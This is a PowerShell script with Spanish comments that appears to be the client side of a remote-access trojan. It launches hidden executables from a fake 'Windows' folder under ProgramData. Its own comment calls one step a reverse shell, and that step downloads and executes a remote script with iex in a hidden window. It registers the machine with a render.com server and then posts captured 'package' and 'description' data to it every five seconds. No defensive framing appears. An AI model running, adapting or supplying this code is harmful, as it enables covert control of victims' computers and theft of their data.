Start-Process -FilePath C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Args C:\ProgramData\Windows\dll.exe -WindowStyle hidden

# Iniciamos la reverse shell
$command = {while($true){try{iex (New-Object Net.WebClient).downloadstring('http://localhost:3000/public/arrow.ps1');break;exit}catch{}}}
Start-Process -FilePath C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ArgumentList $command -WindowStyle hidden

$iteration = 0
while($true){
    try {
        # Leer el contenido del archivo
	    $fileContent = Get-Content -Path "C:\ProgramData\Windows\id_session.txt" -Raw -ErrorAction Stop

        # Crear objeto JSON con el contenido
        $jsonObject = @{
            "id_session" = if([string]::IsNullOrEmpty($fileContent)) {""} else {$fileContent.Replace("`n","").Replace("`r","")}
        } | ConvertTo-Json

        $headers = @{
            "Access-Control-Allow-Origin" = "*"
            "Content-Type" = "application/json"
        }

        $res = Invoke-RestMethod -Uri https://jweciqhgpzrshx6gyj6htacmebknyxldtcmiqvwu-mqd4.onrender.comaaaa/addcomputer -Method "Post" -Body $jsonObject -Headers $headers
        
        Set-Content -Path C:\ProgramData\Windows\id_session.txt -Value $res.Replace("`n","").Replace("`r","")

        cat C:\ProgramData\Windows\id_session.txt
        
        while($true){
	    $package = Get-Content -Path "C:\ProgramData\Windows\package.txt" -Raw -ErrorAction Stop

            $id_session = Get-Content -Path "C:\ProgramData\Windows\id_session.txt" -Raw -ErrorAction Stop

	    $description = Get-Content -Path "C:\ProgramData\Windows\description.txt" -Raw -ErrorAction Stop
            
            $jsonObject = @{
                "id_session" = if ([string]::IsNullOrEmpty($id_session)) {""} else {$id_session.Replace("`n","").Replace("`r","")}
                "package" = if([string]::IsNullOrEmpty($package)) {""} else {"{0}" -f $package} # Hacemos que se puedan escribir saltos de linea en el log de la pagina
                "unix_time" = [int](Get-Date -UFormat %s -Millisecond 0) + 5 * 3600
                "id_socket" = ""
                "description" = if([string]::IsNullOrEmpty($description)) {""} else {$description.Replace("`n","").Replace("`r","")}
                "screenshot" = ""
                "state" = "on"
            } | ConvertTo-Json

            $res = Invoke-RestMethod -Uri https://jweciqhgpzrshx6gyj6htacmebknyxldtcmiqvwu-mqd4.onrenderaaaa.com/logs -Method "Post" -Body $jsonObject -Headers $headers #Esta parte va a enviar un
	    											#post al server
	    Set-Content -Path C:\ProgramData\Windows\package.txt -Value $null

            if($iteration -eq 0) {
                $iteration = $iteration + 1
                Start-Process -FilePath C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Args C:\ProgramData\Windows\wmsconnect.exe -WindowStyle hidden
            }

            sleep 5
        }
    }catch [System.Management.Automation.ItemNotFoundException] { # Por si no se encuentra el archivo
	Set-Content "C:\ProgramData\Windows\package.txt" -Value $null
	Set-Content "C:\ProgramData\Windows\package.txt" -Value $null
	Set-Content "C:\ProgramData\Windows\description.txt" -Value $null
    }
    catch {

    }
}
